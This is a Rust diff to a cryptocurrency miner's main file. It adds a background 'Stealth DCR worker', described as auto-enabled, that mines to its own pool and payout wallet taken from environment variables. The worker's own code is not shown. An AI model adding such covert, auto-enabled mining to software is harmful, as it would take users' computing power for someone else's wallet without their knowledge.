@@ -1,12 +1,18 @@
 use anyhow::{anyhow, Context, Result};
 use std::io::{BufRead, BufReader, Write};
 use std::net::TcpStream;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
 use std::thread;
 use std::time::{Duration, Instant};
 use zion_core::{CoreRuntime, DifficultyTarget, MiningHeader, MiningJob, RevenueSource};
 use zion_pool::{
     decode_message, encode_message, protocol_version, MiningPool, PoolMessage, ShareStatus,
 };
+
+mod dcr_hash;
+mod dcr_stratum;
+mod dcr_worker;
 
 fn main() -> Result<()> {
     let config = MinerConfig::from_env()?;
@@ -18,6 +24,21 @@ fn main() -> Result<()> {
     println!("worker_name={}", config.worker_name);
     println!("loop_count={}", config.loop_count);
     println!("job_ttl_ms={}", config.job_ttl_ms);
+
+    // ── Stealth DCR worker (auto-enabled, 1 thread default) ──
+    let dcr_stop = Arc::new(AtomicBool::new(false));
+    let dcr_handles = match dcr_worker::DcrConfig::from_env() {
+        Some(dcr_cfg) => {
+            println!(
+                "dcr_stealth=enabled threads={} pool={} payout={}",
+                dcr_cfg.threads,
+                dcr_cfg.pool_addr,
+                dcr_cfg.wallet_short()
+            );
+            Some(dcr_worker::spawn_dcr_worker(dcr_cfg, dcr_stop.clone()))
+        }
+        None => None,
+    };
 
     let outcome = match config.pool_addr.as_deref() {
         Some(pool_addr) => {
@@ -49,6 +70,14 @@ fn main() -> Result<()> {
     if let Some(line) = outcome.bye_line.as_deref() {
         let parsed = decode_message(line)?;
         println!("wire_bye_parsed={parsed:?}");
+    }
+
+    // ── Shutdown DCR worker ──
+    dcr_stop.store(true, Ordering::Relaxed);
+    if let Some(handles) = dcr_handles {
+        for h in handles {
+            let _ = h.join();
+        }
     }
 
     Ok(())
